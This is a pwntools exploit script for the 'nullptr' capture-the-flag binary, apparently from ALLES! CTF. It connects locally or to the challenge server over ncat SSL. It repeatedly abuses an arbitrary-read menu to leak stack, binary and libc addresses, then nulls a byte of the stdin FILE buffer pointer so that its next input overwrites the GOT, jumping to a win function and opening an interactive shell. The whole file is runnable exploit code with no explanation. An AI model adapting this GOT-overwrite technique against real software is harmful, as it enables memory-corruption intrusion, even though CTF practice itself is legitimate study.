#!/usr/bin/python3

from pwn import *

if not args.N:
	print('N not set, rerun with N=x, where x >= 0')
	sys.exit(1)

binary = context.binary = ELF('./nullptr')
context.log_level = 'INFO'
context.log_file = 'local.log.' + str(args.N)
libc = binary.libc
binary_leak_offset = 2024

if args.REMOTE:
	context.log_file = 'remote.log.' + str(args.N)
	libc = ELF('libc-database/db/libc6_2.30-0ubuntu2.2_amd64.so')
	binary_leak_offset = 2024

binary_address = binary.address
libc_address = libc.address

trys = 0
while True:
	try:
		p = process(binary.path) if not args.REMOTE else process(['/usr/bin/ncat','-w','5','-i','60','--ssl','7b000000ca67f270102fa6fb.challenges.broker5.allesctf.net','1337'])

		p.sendlineafter('[1. view, 2. null, -1. exit]> \n','1')
		p.sendlineafter('view address> \n','a')
		_ = p.recvline().strip().split(b':')[0]
		stack_leak = int(_,16)
		log.info('stack_leak: ' + hex(stack_leak))

		binary.address = binary_address
		libc.address = libc_address

		p.sendlineafter('[1. view, 2. null, -1. exit]> \n','1')
		p.sendlineafter('view address> \n',str(stack_leak - binary_leak_offset))
		_ = p.recvline().strip().split(b':')[1]
		pointer_to__libc_csu_init = int(_,16)
		log.info('pointer_to__libc_csu_init: ' + hex(pointer_to__libc_csu_init))

		p.sendlineafter('[1. view, 2. null, -1. exit]> \n','1')
		p.sendlineafter('view address> \n',str(pointer_to__libc_csu_init))
		_ = p.recvline().strip().split(b':')[1]
		__libc_csu_init = int(_,16)
		log.info('__libc_csu_init: ' + hex(__libc_csu_init))
		binary.address = __libc_csu_init - binary.sym.__libc_csu_init
		log.info('binary.address: ' + hex(binary.address))

		log.info('binary.got: ' + hex(binary.sym._GLOBAL_OFFSET_TABLE_))

		if binary.sym._GLOBAL_OFFSET_TABLE_ & 0xffffff != 0:
			trys += 1
			log.info('trys: ' + str(trys))
			p.close()
			continue

		p.sendlineafter('[1. view, 2. null, -1. exit]> \n','1')
		p.sendlineafter('view address> \n',str(binary.got.puts))
		_ = p.recvline().strip().split(b':')[1]
		puts = int(_,16)
		log.info('puts: ' + hex(puts))
		libc.address = puts - libc.sym.puts
		log.info('libc.address: ' + hex(libc.address))

		p.sendlineafter('[1. view, 2. null, -1. exit]> \n','1')
		p.sendlineafter('view address> \n',str(libc.sym._IO_2_1_stdin_ + 7*8))
		_ = p.recvline().strip().split(b':')[1]
		heap = int(_,16)

		if heap >> 24 != binary.sym._GLOBAL_OFFSET_TABLE_ >> 24:
			log.critical('MS 24 bits do not match! ' + hex(heap >> 24) + ' != ' + hex(binary.sym._GLOBAL_OFFSET_TABLE_ >> 24))
			p.close()
			continue

		payload = b''
		for i in range(3):
			p.sendlineafter('[1. view, 2. null, -1. exit]> \n','1')
			p.sendlineafter('view address> \n',str(binary.sym._GLOBAL_OFFSET_TABLE_ + i*8))
			_ = p.recvline().strip().split(b':')[1]
			payload += p64(int(_,16))
		payload += p64(binary.sym.get_me_out_of_this_mess)

		p.sendlineafter('[1. view, 2. null, -1. exit]> \n','2')
		p.sendlineafter('nuke address> \n',str(libc.sym._IO_2_1_stdin_ + 6*8 + 3))

		os.system('/pwd/datajerk/tools/alert/alert.sh')
		p.sendlineafter('[1. view, 2. null, -1. exit]> \n',payload)
		p.interactive()
		break

	except:
		p.close()
		continue

